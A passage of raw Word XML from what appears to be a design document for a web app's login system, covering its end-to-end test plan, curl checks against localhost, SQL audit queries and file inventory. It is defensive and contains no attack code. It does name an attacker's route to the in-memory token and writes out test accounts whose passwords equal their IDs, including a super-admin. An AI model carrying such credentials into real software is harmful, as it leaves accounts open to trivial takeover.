                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>localStorage.getItem('accessToken');   // → null (we don't use localStorage)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>sessionStorage.getItem('jwt');         // → null</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Object.keys(localStorage);             // → []</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Best case for an attacker: walk the React fiber tree to find the</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// accessToken in memory. Token is 15-min-life and the cookie is unreadable;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// they get one short-lived token at most.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part XI  ·  End-to-End Verification &amp; Test Plan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>The 12-step browser acceptance test plus the curl matrix and SQL audit queries that constitute the formal sign-off for Phase 4.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>11.1  Setup</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Terminal A — backend</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cd "SOFTWARE CODE/BE"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm install</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cp .env.example .env</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Edit .env: set DB_USER/DB_PASSWORD + generate two distinct JWT secrets via</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>#   node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm run dev</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Expect: "DB pool ready" then "Server ready" log lines.</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Terminal B — frontend</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cd "SOFTWARE CODE/FE"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>cp .env.example .env</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm install</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>npm run dev</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Expect: Vite serves on http://localhost:5173/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>11.2  Browser Smoke (12 steps)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="567"/>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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>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Action</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>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Expected pass condition</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1</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Open http://localhost:5173/</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Redirects to /login; hero (CMCMIS / sub / ISRO SAC) + card render</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2</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DevTools → Network — reload</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POST /api/v1/auth/refresh returns 401/403 (no session yet); FE stays on /login</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3</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Submit empty form</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Per-field error: 'Format: 2 uppercase letters + 5 digits'</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4</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Submit SA79900 / WRONG12</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Red banner 'Invalid credentials' (BE 401)</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5</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Submit SA79900 / SA79900</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Navigate to /dashboard; sidebar shows 7 items + role pill SUPER_ADMIN</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6</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DevTools → Application → Cookies</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cmcmis_rt has HttpOnly ✓ Path /api/v1/auth · cmcmis_csrf NOT httpOnly</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7</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DevTools → Console: document.cookie</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Returns only cmcmis_csrf=… — refresh token invisible to JS</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8</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Object.keys(localStorage) / sessionStorage</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Both empty</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9</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Click 'Manage Users' in the sidebar</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/admin/users placeholder renders (SA has user:read-list)</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10</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Sign out → log in as DS00001 / DS00001</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Sidebar narrower (4 items); 'Manage Users' and 'Audit Log' missing</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11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Manually type /admin/users in URL bar</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&lt;Forbidden&gt; page renders, names 'user:read-list'; no redirect loop, no server 500</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12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3969"/>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Wait 15 min idle, click anywhere in the app</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Network shows ONE coalesced /auth/refresh (200); the user action retries automatically with the new Bearer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>11.3  Backend curl Matrix</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Login happy path</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -s -X POST http://localhost:3000/api/v1/auth/login \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H 'Content-Type: application/json' \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -d '{"employee_id":"SA79900","password":"SA79900"}' -c cookies.txt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/me with the token returned above</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -s http://localhost:3000/api/v1/me -H "Authorization: Bearer $ACCESS"</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Refresh — CSRF must match</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>CSRF=$(grep cmcmis_csrf cookies.txt | awk '{print $7}')</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -s -X POST http://localhost:3000/api/v1/auth/refresh \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H "X-CSRF-Token: $CSRF" -b cookies.txt -c cookies.txt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Logout — needs Bearer</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -s -X POST http://localhost:3000/api/v1/auth/logout \</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     -H "Authorization: Bearer $ACCESS" -b cookies.txt</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → 204 No Content; cookies cleared by Set-Cookie</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>11.4  SQL Audit Spot-Check</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SQL</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>-- All login activity in the last 10 minutes, grouped by outcome</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>SELECT outcome, COUNT(*) FROM final.login_audit</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> WHERE attempt_at &gt; NOW() - INTERVAL 10 MINUTE</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> GROUP BY outcome;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>-- Expect SUCCESS, FAILED_BAD_PASSWORD (if you tried bad pw), LOGOUT,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>--        TOKEN_REFRESH (after the 15-min retry test).</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 Refresh-token lifecycle visibility</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>SELECT user_id, LEFT(token_hash,16) AS hash16,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       revoked_reason, issued_at</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  FROM final.refresh_tokens</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> ORDER BY token_id DESC LIMIT 10;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>-- Expect: one active row (revoked_reason IS NULL) per active session;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>-- ROTATED rows from /auth/refresh calls; LOGOUT rows from sign-outs.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>11.5  Acceptance Criteria — Phase 4 Sealed When …</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Sealed</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All 12 browser smoke steps green.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>curl matrix returns the documented responses.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SQL counts show SUCCESS, FAILED_BAD_PASSWORD, LOGOUT and TOKEN_REFRESH rows in login_audit.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>refresh_tokens.token_hash entries are 64-char hex (never raw JWT strings).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DevTools Console: document.cookie has no cmcmis_rt; localStorage empty.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part XII  ·  File Inventory &amp; Phase 4 Sign-off</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>12.1  Backend Files (21 total)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="567"/>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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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Path (under SOFTWARE CODE/BE/)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5102"/>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Purpose</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1</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.env.example</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Env template; gitignored .env carries real secrets</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2</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.gitignore</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node_modules, .env, logs</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3</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package.json</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Deps + npm scripts; NO typescript/@types</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4</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README.md</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Quick-start + hard rules</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5</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src/server.js</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Entry: env→logger→db→middleware→routes→404→errorHandler</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6</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src/config/env.js</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envalid-validated process.env; cross-field invariants</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7</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src/config/logger.js</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pino + redact paths for Authorization/Cookie/Set-Cookie</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8</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src/config/db.js</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mysql2 pool, multipleStatements:false, boot SELECT 1</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9</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src/config/jwt.js</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Facade: alg + secrets + TTLs</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10</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src/middleware/errorHandler.js</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AppError + errors{} + notFoundHandler + default handler</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11</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src/middleware/validate.js</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Generic zod-schema runner factory</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12</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src/middleware/authenticate.js</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Bearer verify → req.user</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13</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src/middleware/authorize.js</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Permission-gate factory + authorizeAny</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14</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src/middleware/rateLimit.js</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loginLimiter (10/15min) + refreshLimiter (30/min)</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15</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src/modules/auth/auth.routes.js</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POST /login · /refresh · /logout</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16</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src/modules/auth/auth.controller.js</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HTTP shims; cookies set/cleared here</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17</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src/modules/auth/auth.service.js</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login + refresh (rotation + theft) + logout</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18</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src/modules/auth/auth.validators.js</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zod loginSchema + refreshSchema</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19</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src/modules/auth/users.repo.js</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Users + RBAC JOIN</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20</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src/modules/auth/refreshTokens.repo.js</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Persist / findValid / revoke / revokeAllForUser</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21</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src/modules/auth/loginAudit.repo.js</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Append-only audit writer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
